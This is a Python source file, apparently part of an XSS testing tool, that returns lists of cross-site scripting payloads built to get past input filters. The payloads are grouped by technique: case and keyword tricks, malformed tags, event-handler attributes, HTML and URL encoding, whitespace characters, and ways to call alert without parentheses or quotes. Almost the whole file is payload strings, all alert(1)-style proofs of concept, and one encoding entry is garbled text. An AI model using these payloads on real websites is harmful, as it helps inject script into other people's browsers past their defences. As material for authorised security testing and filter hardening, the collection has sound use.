#!/usr/bin/env python3

"""
Filter Evasion XSS Payloads

Payloads designed to bypass input filters and sanitization.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class FilterEvasionPayloads:
    """Filter evasion XSS payload collection"""
    
    @staticmethod
    def get_keyword_filter_bypass() -> List[str]:
        """Bypass keyword-based filters"""
        return [
            # Case variations
            '<ScRiPt>alert(1)</ScRiPt>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<Script>AleRt(1)</Script>',
            '<ScRiPt>AlErT(1)</ScRiPt>',
            
            # Character insertion
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<script>/**/alert(1)</script>',
            '<script>alert/**/("1")</script>',
            '<script>alert(/**/"1")</script>',
            
            # Alternative syntax
            '<svg onload=alert(1)>',
            '<img src=x onerror=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            
            # String concatenation
            '<script>eval("ale"+"rt(1)")</script>',
            '<script>window["ale"+"rt"](1)</script>',
            '<script>this["ale"+"rt"](1)</script>',
            '<script>self["ale"+"rt"](1)</script>',
            
            # Function alternatives
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>',
            '<script>console.log(1)</script>',
            '<script>console.error(1)</script>',
            
            # Constructor manipulation
            '<script>[].constructor.constructor("alert(1)")()</script>',
            '<script>({}).constructor.constructor("alert(1)")()</script>',
            '<script>Function("alert(1)")()</script>',
        ]
    
    @staticmethod
    def get_tag_filter_bypass() -> List[str]:
        """Bypass HTML tag filters"""
        return [
            # Unclosed tags
            '<script>alert(1)',
            '<script>alert(1)//</script>',
            '<script>alert(1)/*</script>',
            
            # Malformed tags
            '<<script>alert(1)</script>',
            '<script<script>alert(1)</script>',
            '<script>alert(1)<</script>/script>',
            
            # Alternative tags
            '<svg onload=alert(1)>',
            '<math><mtext><script>alert(1)</script></mtext></math>',
            '<foreignObject><script>alert(1)</script></foreignObject>',
            
            # Data attributes
            '<div data-x="&lt;script&gt;alert(1)&lt;/script&gt;" onclick="eval(this.dataset.x.replace(/&lt;/g,'<').replace(/&gt;/g,'>'))">',  # type: ignore[list-item]
            
            # Form elements
            '<form action="javascript:alert(1)"><input type=submit>',
            '<button formaction="javascript:alert(1)">',
            '<input type="image" formaction="javascript:alert(1)">',
            
            # CSS injection
            '<style>@import"javascript:alert(1)";</style>',
            '<style>body{background:url("javascript:alert(1)")}</style>',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            
            # Meta tag refresh
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
        ]
    
    @staticmethod
    def get_attribute_filter_bypass() -> List[str]:
        """Bypass attribute-based filters"""
        return [
            # Event handler variations
            '<img src=x onerror=alert(1)>',
            '<img src=x OnError=alert(1)>',
            '<img src=x ONERROR=alert(1)>',
            '<img src=x onError=alert(1)>',
            
            # Space variations
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror =alert(1)>',
            '<img src=x onerror= alert(1)>',
            '<img src=x onerror = alert(1)>',
            
            # Quote variations
            '<img src=x onerror="alert(1)">',
            '<img src=x onerror=\'alert(1)\'>',
            '<img src=x onerror=`alert(1)`>',
            '<img src=x onerror=alert(1)>',
            
            # Encoded attributes
            '<img src=x o&#110;error=alert(1)>',
            '<img src=x on&#101;rror=alert(1)>',
            '<img src=x &#111;nerror=alert(1)>',
            
            # Alternative events
            '<img src=x onload=alert(1)>',
            '<img src=x onabort=alert(1)>',
            '<img src=x oninvalid=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            
            # Data URLs
            '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
            '<object data="data:text/html,<script>alert(1)</script>">',
            '<embed src="data:text/html,<script>alert(1)</script>">',
        ]
    
    @staticmethod
    def get_encoding_bypass() -> List[str]:
        """Bypass encoding-based filters"""
        return [
            # HTML entities
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            '&LT;script&GT;alert(1)&LT;/script&GT;',
            
            # URL encoding
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '%3cscript%3ealert(1)%3c/script%3e',
            '%3CSCRIPT%3EALERT(1)%3C/SCRIPT%3E',
            
            # Double URL encoding
            '%253Cscript%253Ealert(1)%253C/script%253E',
            '%2527%253E%253Cscript%253Ealert(1)%253C/script%253E',
            
            # Unicode encoding
            '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',
            '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
            '\\74script\\76alert(1)\\74/script\\76',
            
            # UTF-8 encoding
            'пїЅpїЅscriptпїЅпїЅalert(1)пїЅпїЅ/scriptпїЅпїЅ',
            '%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE',
            
            # Mixed encoding
            '%3Cscr&#105;pt%3Ealert(1)%3C/scr&#105;pt%3E',
            '&lt;scr%69pt&gt;alert(1)&lt;/scr%69pt&gt;',
            '&#60;scr\\x69pt&#62;alert(1)&#60;/scr\\x69pt&#62;',
        ]
    
    @staticmethod
    def get_whitespace_bypass() -> List[str]:
        """Bypass whitespace-based filters"""
        return [
            # Various whitespace chars
            '<script\x09>alert(1)</script>',  # Tab
            '<script\x0A>alert(1)</script>',  # Line Feed
            '<script\x0B>alert(1)</script>',  # Vertical Tab
            '<script\x0C>alert(1)</script>',  # Form Feed
            '<script\x0D>alert(1)</script>',  # Carriage Return
            '<script\x20>alert(1)</script>',  # Space
            
            # Unicode whitespace
            '<script\u2000>alert(1)</script>',  # En Quad
            '<script\u2001>alert(1)</script>',  # Em Quad
            '<script\u2002>alert(1)</script>',  # En Space
            '<script\u2003>alert(1)</script>',  # Em Space
            '<script\u2004>alert(1)</script>',  # Three-Per-Em Space
            '<script\u2005>alert(1)</script>',  # Four-Per-Em Space
            '<script\u2006>alert(1)</script>',  # Six-Per-Em Space
            '<script\u2007>alert(1)</script>',  # Figure Space
            '<script\u2008>alert(1)</script>',  # Punctuation Space
            '<script\u2009>alert(1)</script>',  # Thin Space
            '<script\u200A>alert(1)</script>',  # Hair Space
            '<script\u200B>alert(1)</script>',  # Zero Width Space
            '<script\u3000>alert(1)</script>',  # Ideographic Space
            
            # Multiple whitespace
            '<script\x20\x09\x0A>alert(1)</script>',
            '<script\x20\x20\x20>alert(1)</script>',
            '<script\t\t\t>alert(1)</script>',
            
            # No whitespace
            '<script>alert(1)</script>',
            '<img/src=x/onerror=alert(1)>',
            '<svg/onload=alert(1)>',
        ]
    
    @staticmethod
    def get_parentheses_bypass() -> List[str]:
        """Bypass parentheses filters"""
        return [
            # Template literals
            '<script>alert`1`</script>',
            '<script>eval`alert\\`1\\``</script>',
            '<script>Function`alert\\`1\\```</script>',
            '<script>setTimeout`alert\\`1\\``,1`</script>',
            
            # Array access
            '<script>alert[String.fromCharCode(49)]</script>',
            '<script>window[atob("YWxlcnQ=")][1]</script>',
            
            # Indirect calls
            '<script>setTimeout(alert,1,1)</script>',
            '<script>setInterval(alert,1,1)</script>',
            '<script>requestAnimationFrame(alert.bind(null,1))</script>',
            
            # Constructor access
            '<script>[].constructor.constructor`alert\\`1\\```</script>',
            '<script>Object.constructor.constructor`alert\\`1\\```</script>',
            
            # Event handlers without parentheses
            '<img src=x onerror=alert`1`>',
            '<svg onload=alert`1`>',
            '<iframe onload=alert`1`>',
            
            # Throw expressions
            '<script>throw alert(1)</script>',
            '<script>void alert(1)</script>',
            '<script>delete alert(1)</script>',
            '<script>typeof alert(1)</script>',
        ]
    
    @staticmethod
    def get_quotes_bypass() -> List[str]:
        """Bypass quote filters"""
        return [
            # No quotes
            '<script>alert(1)</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            
            # String.fromCharCode
            '<script>alert(String.fromCharCode(49))</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            
            # Hex encoding
            '<script>alert(\\x31)</script>',
            '<script>eval(\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29)</script>',
            
            # Unicode encoding
            '<script>alert(\\u0031)</script>',
            '<script>eval(\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029)</script>',
            
            # Octal encoding
            '<script>alert(\\61)</script>',
            '<script>eval(\\141\\154\\145\\162\\164\\50\\61\\51)</script>',
            
            # Template literals
            '<script>alert`1`</script>',
            '<script>eval`alert\\`1\\``</script>',
            
            # Alternative delimiters
            '<img src=x onerror=alert(1)>',
            '<img src="x" onerror=alert(1)>',
            '<img src=\'x\' onerror=alert(1)>',
            '<img src=`x` onerror=alert(1)>',
        ]
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all filter evasion XSS payloads"""
        payloads = []
        payloads.extend(FilterEvasionPayloads.get_keyword_filter_bypass())
        payloads.extend(FilterEvasionPayloads.get_tag_filter_bypass())
        payloads.extend(FilterEvasionPayloads.get_attribute_filter_bypass())
        payloads.extend(FilterEvasionPayloads.get_encoding_bypass())
        payloads.extend(FilterEvasionPayloads.get_whitespace_bypass())
        payloads.extend(FilterEvasionPayloads.get_parentheses_bypass())
        payloads.extend(FilterEvasionPayloads.get_quotes_bypass())
        return payloads